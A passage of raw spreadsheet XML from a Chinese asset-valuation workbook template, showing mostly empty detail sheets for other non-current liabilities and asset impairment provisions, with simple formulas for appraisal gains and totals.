        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="564">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="624" t="n"/>
      <c r="F24" s="564" t="n"/>
      <c r="G24" s="564">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="564">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="624" t="n"/>
      <c r="F25" s="564" t="n"/>
      <c r="G25" s="564">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="564">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="624" t="n"/>
      <c r="F26" s="564" t="n"/>
      <c r="G26" s="564">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="564">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="624" t="n"/>
      <c r="F27" s="564" t="n"/>
      <c r="G27" s="564">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="564">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116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555">
        <f>SUM(E6:E27)</f>
        <v/>
      </c>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="564">
        <f>F28-E28</f>
        <v/>
      </c>
      <c r="H28" s="564">
        <f>IF(E28=0,"",G28/E28*100)</f>
        <v/>
      </c>
      <c r="I28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I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8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 codeName="Sheet105">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="R21" sqref="R21"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="17.8333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col width="9" customWidth="1" style="410" min="11" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他非流动负债评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customHeight="1" s="415">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="547" t="n"/>
      <c r="I3" s="547" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表6-9</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="185" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>户名（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555">
        <f>G6-F6</f>
        <v/>
      </c>
      <c r="I6" s="555">
        <f>IF(F6=0,"",H6/F6*100)</f>
        <v/>
      </c>
      <c r="J6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555">
        <f>G7-F7</f>
        <v/>
      </c>
      <c r="I7" s="555">
        <f>IF(F7=0,"",H7/F7*100)</f>
        <v/>
      </c>
      <c r="J7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="560" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555">
        <f>G8-F8</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>IF(F8=0,"",H8/F8*100)</f>
        <v/>
      </c>
      <c r="J8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="560" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555">
        <f>G9-F9</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>IF(F9=0,"",H9/F9*100)</f>
        <v/>
      </c>
      <c r="J9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="560" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555">
        <f>G10-F10</f>
        <v/>
      </c>
      <c r="I10" s="555">
        <f>IF(F10=0,"",H10/F10*100)</f>
        <v/>
      </c>
      <c r="J10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="560" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555">
        <f>G11-F11</f>
        <v/>
      </c>
      <c r="I11" s="555">
        <f>IF(F11=0,"",H11/F11*100)</f>
        <v/>
      </c>
      <c r="J11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="560" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555">
        <f>G12-F12</f>
        <v/>
      </c>
      <c r="I12" s="555">
        <f>IF(F12=0,"",H12/F12*100)</f>
        <v/>
      </c>
      <c r="J12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="560" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555">
        <f>G13-F13</f>
        <v/>
      </c>
      <c r="I13" s="555">
        <f>IF(F13=0,"",H13/F13*100)</f>
        <v/>
      </c>
      <c r="J13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="560" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555">
        <f>G14-F14</f>
        <v/>
      </c>
      <c r="I14" s="555">
        <f>IF(F14=0,"",H14/F14*100)</f>
        <v/>
      </c>
      <c r="J14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="560" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555">
        <f>G15-F15</f>
        <v/>
      </c>
      <c r="I15" s="555">
        <f>IF(F15=0,"",H15/F15*100)</f>
        <v/>
      </c>
      <c r="J15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="560" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555">
        <f>G16-F16</f>
        <v/>
      </c>
      <c r="I16" s="555">
        <f>IF(F16=0,"",H16/F16*100)</f>
        <v/>
      </c>
      <c r="J16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="560" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555">
        <f>G17-F17</f>
        <v/>
      </c>
      <c r="I17" s="555">
        <f>IF(F17=0,"",H17/F17*100)</f>
        <v/>
      </c>
      <c r="J17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="560" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555">
        <f>G18-F18</f>
        <v/>
      </c>
      <c r="I18" s="555">
        <f>IF(F18=0,"",H18/F18*100)</f>
        <v/>
      </c>
      <c r="J18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="560" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555">
        <f>G19-F19</f>
        <v/>
      </c>
      <c r="I19" s="555">
        <f>IF(F19=0,"",H19/F19*100)</f>
        <v/>
      </c>
      <c r="J19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="560" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555">
        <f>G20-F20</f>
        <v/>
      </c>
      <c r="I20" s="555">
        <f>IF(F20=0,"",H20/F20*100)</f>
        <v/>
      </c>
      <c r="J20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="560" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555">
        <f>G21-F21</f>
        <v/>
      </c>
      <c r="I21" s="555">
        <f>IF(F21=0,"",H21/F21*100)</f>
        <v/>
      </c>
      <c r="J21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="560" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555">
        <f>G22-F22</f>
        <v/>
      </c>
      <c r="I22" s="555">
        <f>IF(F22=0,"",H22/F22*100)</f>
        <v/>
      </c>
      <c r="J22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="560" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555">
        <f>G23-F23</f>
        <v/>
      </c>
      <c r="I23" s="555">
        <f>IF(F23=0,"",H23/F23*100)</f>
        <v/>
      </c>
      <c r="J23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="560" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555">
        <f>G24-F24</f>
        <v/>
      </c>
      <c r="I24" s="555">
        <f>IF(F24=0,"",H24/F24*100)</f>
        <v/>
      </c>
      <c r="J24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="560" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555">
        <f>G25-F25</f>
        <v/>
      </c>
      <c r="I25" s="555">
        <f>IF(F25=0,"",H25/F25*100)</f>
        <v/>
      </c>
      <c r="J25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="560" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="560" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>SUM(G6:G27)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J28">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B5)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="9" scale="92" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0">
    <oddHeader/>
    <oddFooter>&amp;L被评估单位填表人：张三_x000a_填表日期：2022年02月25日&amp;R&amp;"宋体"&amp;11 评估人员：</oddFooter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 codeName="Sheet106">
    <tabColor rgb="FFC00000"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:BF66"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A6" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="G6" sqref="G6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="8.83333333333333" defaultRowHeight="17.6"/>
  <cols>
    <col width="6.83333333333333" customWidth="1" style="389" min="1" max="1"/>
    <col width="13.1666666666667" customWidth="1" style="389" min="2" max="2"/>
    <col width="31.3333333333333" customWidth="1" style="389" min="3" max="3"/>
    <col width="21.6666666666667" customWidth="1" style="389" min="4" max="4"/>
    <col hidden="1" width="21.5" customWidth="1" style="389" min="5" max="5"/>
    <col hidden="1" width="18.6666666666667" customWidth="1" style="389" min="6" max="6"/>
    <col hidden="1" width="11.1666666666667" customWidth="1" style="389" min="7" max="7"/>
    <col width="14.1666666666667" customWidth="1" style="389" min="8" max="8"/>
    <col width="8.83333333333333" customWidth="1" style="389" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="20" customHeight="1" s="415">
      <c r="A1" s="71" t="inlineStr">
        <is>
          <t>资产减值准备备查付表</t>
        </is>
      </c>
      <c r="I1" s="389" t="n"/>
      <c r="J1" s="389" t="n"/>
      <c r="K1" s="389" t="n"/>
      <c r="L1" s="389" t="n"/>
      <c r="M1" s="389" t="n"/>
      <c r="N1" s="389" t="n"/>
      <c r="O1" s="389" t="n"/>
      <c r="P1" s="389" t="n"/>
      <c r="Q1" s="389" t="n"/>
      <c r="R1" s="389" t="n"/>
      <c r="S1" s="389" t="n"/>
      <c r="T1" s="389" t="n"/>
      <c r="U1" s="389" t="n"/>
      <c r="V1" s="389" t="n"/>
      <c r="W1" s="389" t="n"/>
      <c r="X1" s="389" t="n"/>
      <c r="Y1" s="389" t="n"/>
      <c r="Z1" s="389" t="n"/>
      <c r="AA1" s="389" t="n"/>
      <c r="AB1" s="389" t="n"/>
      <c r="AC1" s="389" t="n"/>
      <c r="AD1" s="389" t="n"/>
      <c r="AE1" s="389" t="n"/>
      <c r="AF1" s="389" t="n"/>
      <c r="AG1" s="389" t="n"/>
      <c r="AH1" s="389" t="n"/>
      <c r="AI1" s="389" t="n"/>
      <c r="AJ1" s="389" t="n"/>
      <c r="AK1" s="389" t="n"/>
      <c r="AL1" s="389" t="n"/>
      <c r="AM1" s="389" t="n"/>
      <c r="AN1" s="389" t="n"/>
      <c r="AO1" s="389" t="n"/>
      <c r="AP1" s="389" t="n"/>
      <c r="AQ1" s="389" t="n"/>
      <c r="AR1" s="389" t="n"/>
      <c r="AS1" s="389" t="n"/>
      <c r="AT1" s="389" t="n"/>
      <c r="AU1" s="389" t="n"/>
      <c r="AV1" s="389" t="n"/>
      <c r="AW1" s="389" t="n"/>
      <c r="AX1" s="389" t="n"/>
      <c r="AY1" s="389" t="n"/>
      <c r="AZ1" s="389" t="n"/>
      <c r="BA1" s="389" t="n"/>
      <c r="BB1" s="389" t="n"/>
      <c r="BC1" s="389" t="n"/>
      <c r="BD1" s="389" t="n"/>
      <c r="BE1" s="389" t="n"/>
      <c r="BF1" s="389" t="n"/>
    </row>
    <row r="2" ht="16" customHeight="1" s="415">
      <c r="A2" s="290">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="625" t="n"/>
      <c r="J2" s="625" t="n"/>
      <c r="K2" s="290" t="n"/>
      <c r="L2" s="389" t="n"/>
      <c r="M2" s="389" t="n"/>
      <c r="N2" s="389" t="n"/>
      <c r="O2" s="389" t="n"/>
      <c r="P2" s="389" t="n"/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89" t="n"/>
      <c r="AA2" s="389" t="n"/>
      <c r="AB2" s="389" t="n"/>
      <c r="AC2" s="389" t="n"/>
      <c r="AD2" s="389" t="n"/>
      <c r="AE2" s="389" t="n"/>
      <c r="AF2" s="389" t="n"/>
      <c r="AG2" s="389" t="n"/>
      <c r="AH2" s="389" t="n"/>
      <c r="AI2" s="389" t="n"/>
      <c r="AJ2" s="389" t="n"/>
      <c r="AK2" s="389" t="n"/>
      <c r="AL2" s="389" t="n"/>
      <c r="AM2" s="389" t="n"/>
      <c r="AN2" s="389" t="n"/>
      <c r="AO2" s="389" t="n"/>
      <c r="AP2" s="389" t="n"/>
      <c r="AQ2" s="389" t="n"/>
      <c r="AR2" s="389" t="n"/>
      <c r="AS2" s="389" t="n"/>
      <c r="AT2" s="389" t="n"/>
      <c r="AU2" s="389" t="n"/>
      <c r="AV2" s="389" t="n"/>
      <c r="AW2" s="389" t="n"/>
      <c r="AX2" s="389" t="n"/>
      <c r="AY2" s="389" t="n"/>
      <c r="AZ2" s="389" t="n"/>
      <c r="BA2" s="389" t="n"/>
      <c r="BB2" s="389" t="n"/>
      <c r="BC2" s="389" t="n"/>
      <c r="BD2" s="389" t="n"/>
      <c r="BE2" s="389" t="n"/>
      <c r="BF2" s="389" t="n"/>
    </row>
    <row r="3" ht="16" customHeight="1" s="415">
      <c r="A3" s="290" t="n"/>
      <c r="B3" s="290" t="n"/>
      <c r="C3" s="77" t="n"/>
      <c r="D3" s="78" t="n"/>
      <c r="E3" s="78" t="n"/>
      <c r="F3" s="78" t="n"/>
      <c r="G3" s="78" t="n"/>
      <c r="H3" s="79" t="inlineStr">
        <is>
          <t>表8</t>
        </is>
      </c>
      <c r="I3" s="389" t="n"/>
      <c r="J3" s="389" t="n"/>
      <c r="K3" s="389" t="n"/>
      <c r="L3" s="389" t="n"/>
      <c r="M3" s="389" t="n"/>
      <c r="N3" s="389" t="n"/>
      <c r="O3" s="389" t="n"/>
      <c r="P3" s="389" t="n"/>
      <c r="Q3" s="389" t="n"/>
      <c r="R3" s="389" t="n"/>
      <c r="S3" s="389" t="n"/>
      <c r="T3" s="389" t="n"/>
      <c r="U3" s="389" t="n"/>
      <c r="V3" s="389" t="n"/>
      <c r="W3" s="389" t="n"/>
      <c r="X3" s="389" t="n"/>
      <c r="Y3" s="389" t="n"/>
      <c r="Z3" s="389" t="n"/>
      <c r="AA3" s="389" t="n"/>
      <c r="AB3" s="389" t="n"/>
      <c r="AC3" s="389" t="n"/>
      <c r="AD3" s="389" t="n"/>
      <c r="AE3" s="389" t="n"/>
      <c r="AF3" s="389" t="n"/>
      <c r="AG3" s="389" t="n"/>
      <c r="AH3" s="389" t="n"/>
      <c r="AI3" s="389" t="n"/>
      <c r="AJ3" s="389" t="n"/>
      <c r="AK3" s="389" t="n"/>
      <c r="AL3" s="389" t="n"/>
      <c r="AM3" s="389" t="n"/>
      <c r="AN3" s="389" t="n"/>
      <c r="AO3" s="389" t="n"/>
      <c r="AP3" s="389" t="n"/>
      <c r="AQ3" s="389" t="n"/>
      <c r="AR3" s="389" t="n"/>
      <c r="AS3" s="389" t="n"/>
      <c r="AT3" s="389" t="n"/>
      <c r="AU3" s="389" t="n"/>
      <c r="AV3" s="389" t="n"/>
      <c r="AW3" s="389" t="n"/>
      <c r="AX3" s="389" t="n"/>
      <c r="AY3" s="389" t="n"/>
      <c r="AZ3" s="389" t="n"/>
      <c r="BA3" s="389" t="n"/>
      <c r="BB3" s="389" t="n"/>
      <c r="BC3" s="389" t="n"/>
      <c r="BD3" s="389" t="n"/>
      <c r="BE3" s="389" t="n"/>
      <c r="BF3" s="389" t="n"/>
    </row>
    <row r="4" ht="12" customHeight="1" s="415">
      <c r="A4" s="80">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="B4" s="80" t="n"/>
      <c r="C4" s="77" t="n"/>
      <c r="D4" s="78" t="n"/>
      <c r="E4" s="78" t="n"/>
      <c r="F4" s="78" t="n"/>
      <c r="G4" s="78" t="n"/>
      <c r="H4" s="79">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="389" t="n"/>
      <c r="J4" s="389" t="n"/>
      <c r="K4" s="389" t="n"/>
      <c r="L4" s="389" t="n"/>
      <c r="M4" s="389" t="n"/>
      <c r="N4" s="389" t="n"/>
      <c r="O4" s="389" t="n"/>
      <c r="P4" s="389" t="n"/>
      <c r="Q4" s="389" t="n"/>
      <c r="R4" s="389" t="n"/>
      <c r="S4" s="389" t="n"/>
      <c r="T4" s="389" t="n"/>
      <c r="U4" s="389" t="n"/>
      <c r="V4" s="389" t="n"/>
      <c r="W4" s="389" t="n"/>
      <c r="X4" s="389" t="n"/>
      <c r="Y4" s="389" t="n"/>
      <c r="Z4" s="389" t="n"/>
      <c r="AA4" s="389" t="n"/>
      <c r="AB4" s="389" t="n"/>
      <c r="AC4" s="389" t="n"/>
      <c r="AD4" s="389" t="n"/>
      <c r="AE4" s="389" t="n"/>
      <c r="AF4" s="389" t="n"/>
      <c r="AG4" s="389" t="n"/>
      <c r="AH4" s="389" t="n"/>
      <c r="AI4" s="389" t="n"/>
      <c r="AJ4" s="389" t="n"/>
      <c r="AK4" s="389" t="n"/>
      <c r="AL4" s="389" t="n"/>
      <c r="AM4" s="389" t="n"/>
      <c r="AN4" s="389" t="n"/>
      <c r="AO4" s="389" t="n"/>
      <c r="AP4" s="389" t="n"/>
      <c r="AQ4" s="389" t="n"/>
      <c r="AR4" s="389" t="n"/>
      <c r="AS4" s="389" t="n"/>
      <c r="AT4" s="389" t="n"/>
      <c r="AU4" s="389" t="n"/>
      <c r="AV4" s="389" t="n"/>
      <c r="AW4" s="389" t="n"/>
      <c r="AX4" s="389" t="n"/>
      <c r="AY4" s="389" t="n"/>
